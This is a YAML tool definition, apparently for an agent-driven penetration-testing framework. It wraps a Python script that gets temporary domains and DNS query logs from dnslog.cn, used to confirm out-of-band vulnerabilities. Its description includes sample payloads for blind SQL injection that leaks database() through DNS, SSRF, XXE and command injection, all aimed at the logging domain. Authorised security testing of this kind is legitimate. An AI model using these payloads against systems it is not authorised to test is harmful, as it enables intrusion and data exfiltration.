name: "dnslog"
command: "python3"
args:
  - "-c"
  - "import sys\nimport requests\nimport json\nimport time\nimport os\nimport tempfile\n\nif len(sys.argv) < 2:\n    sys.stderr.write(\"Error: missing operation type argument (get_domain or get_records)\\n\")\n    sys.exit(1)\n\noperation = sys.argv[1]\nbase_url = \"http://dnslog.cn\"\n\n# Use a temp file to store cookies\ncookie_file = os.path.join(tempfile.gettempdir(), \"dnslog_cookie.txt\")\n\n# Create session to persist cookies\nsession = requests.Session()\n\n# Load cookies if cookie file exists\ntry:\n    if os.path.exists(cookie_file):\n        with open(cookie_file, 'r') as f:\n            for line in f:\n                if 'PHPSESSID' in line:\n                    session.cookies.set('PHPSESSID', line.strip().split('=')[1])\nexcept:\n    pass\n\ntry:\n    if operation == \"get_domain\":\n        # Get temporary domain (this sets the cookie)\n        response = session.get(f\"{base_url}/getdomain.php\", timeout=10)\n        response.raise_for_status()\n        domain = response.text.strip().rstrip('%')\n        \n        # Save cookies to file\n        try:\n            with open(cookie_file, 'w') as f:\n                for cookie in session.cookies:\n                    f.write(f\"{cookie.name}={cookie.value}\\n\")\n        except:\n            pass\n        \n        if domain:\n            result = {\n                \"status\": \"success\",\n                \"domain\": domain,\n                \"message\": f\"Successfully obtained temporary domain: {domain}\",\n                \"usage\": f\"Use this domain for DNS query testing, e.g.: nslookup {domain} or ping http://{domain}\",\n                \"note\": \"Domain is valid for 24 hours; query records promptly\"\n            }\n            print(json.dumps(result, ensure_ascii=False, indent=2))\n        else:\n            print(json.dumps({\n                \"status\": \"error\",\n                \"message\": \"Failed to obtain domain, please try again later\"\n            }, ensure_ascii=False, indent=2))\n            sys.exit(1)\n    \n    elif operation == \"get_records\":\n        # Get DNS query records\n        if len(sys.argv) < 3:\n            sys.stderr.write(\"Error: get_records operation requires a domain argument\\n\")\n            sys.exit(1)\n        \n        domain = sys.argv[2]\n        wait_time = int(sys.argv[3]) if len(sys.argv) > 3 else 0\n        \n        if wait_time > 0:\n            time.sleep(wait_time)\n        \n        response = session.get(f\"{base_url}/getrecords.php\", timeout=10)\n        response.raise_for_status()\n        records = response.text.strip()\n        \n        if records and records != '[]':\n            result = {\n                \"status\": \"success\",\n                \"domain\": domain,\n                \"records\": records,\n                \"message\": f\"Found DNS query records for domain {domain}\",\n                \"conclusion\": \"Vulnerability confirmed: target executed DNS query\"\n            }\n        else:\n            result = {\n                \"status\": \"no_records\",\n                \"domain\": domain,\n                \"records\": [],\n                \"message\": f\"No DNS query records found for domain {domain}\",\n                \"suggestion\": \"Wait longer or re-check the payload\"\n            }\n        print(json.dumps(result, ensure_ascii=False, indent=2))\n    \n    else:\n        sys.stderr.write(f\"Error: unsupported operation type '{operation}', must be get_domain or get_records\\n\")\n        sys.exit(1)\n\nexcept requests.exceptions.RequestException as e:\n    print(json.dumps({\n        \"status\": \"error\",\n        \"message\": f\"Network request failed: {str(e)}\",\n        \"suggestion\": \"Check network connection or try again later\"\n    }, ensure_ascii=False, indent=2))\n    sys.exit(1)\nexcept Exception as e:\n    print(json.dumps({\n        \"status\": \"error\",\n        \"message\": f\"Execution error: {str(e)}\"\n    }, ensure_ascii=False, indent=2))\n    sys.exit(1)\n"
enabled: true
short_description: "DNSlog tool for verifying blind injection, SSRF, XXE, and other out-of-band vulnerabilities"
description: |
  DNSlog is a DNS query recording tool implemented via the dnslog.cn service. Primarily used to verify out-of-band vulnerabilities such as blind injection, SSRF, XXE, and command injection.

  **Main features:**
  - Get temporary domain: generate a unique temporary domain for DNS query testing
  - Query DNS records: check whether DNS query requests have reached the domain
  - Supports wait time: can wait a specified period before querying, for asynchronous vulnerability verification

  **Use cases:**
  - **Blind SQL injection testing**: use DNS queries in SQL injection payloads to confirm successful injection
    - Example: `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.dnslog.cn\\abc'))`
  - **SSRF vulnerability verification**: confirm SSRF vulnerability via DNS query
    - Example: `http://target.com/api?url=http://xxx.dnslog.cn`
  - **XXE vulnerability verification**: trigger DNS query via external entity reference
    - Example: `<!ENTITY xxe SYSTEM "http://xxx.dnslog.cn">`
  - **Command injection testing**: use DNS query in command injection payload
    - Example: `nslookup xxx.dnslog.cn` or `ping xxx.dnslog.cn`
  - **Out-of-band vulnerability verification**: any situation requiring confirmation that the target executed a specific action

  **Workflow:**
  1. Use `operation=get_domain` to get a temporary domain (e.g. `abc123.dnslog.cn`)
  2. Use that domain in vulnerability test payloads
  3. Use `operation=get_records` to query whether DNS query records exist
  4. If records are found, the vulnerability exists and the payload was executed

  **Notes:**
  - Temporary domains are valid for 24 hours
  - DNS queries may be delayed; wait a few seconds before querying records
  - This tool depends on the dnslog.cn service and requires a network connection
  - The tool automatically manages cookie sessions to ensure the domain fetch and record query use the same session
parameters:
  - name: "operation"
    type: "string"
    description: |
      Operation type; two operations supported:
      - `get_domain`: get a temporary domain
      - `get_records`: query DNS records
    required: true
    position: 0
    format: "positional"
  - name: "domain"
    type: "string"
    description: |
      Domain parameter (used only for get_records operation).

      When operation is get_records, this parameter is required; provide the temporary domain obtained earlier.
    required: false
    position: 1
    format: "positional"
  - name: "wait_time"
    type: "int"
    description: |
      Wait time in seconds (used only for get_records operation).

      Number of seconds to wait before querying DNS records. Gives the target system enough time to execute the DNS query.
      Recommended value: 3-10 seconds, adjust based on network latency and vulnerability type.
    required: false
    position: 2
    format: "positional"
    default: 0
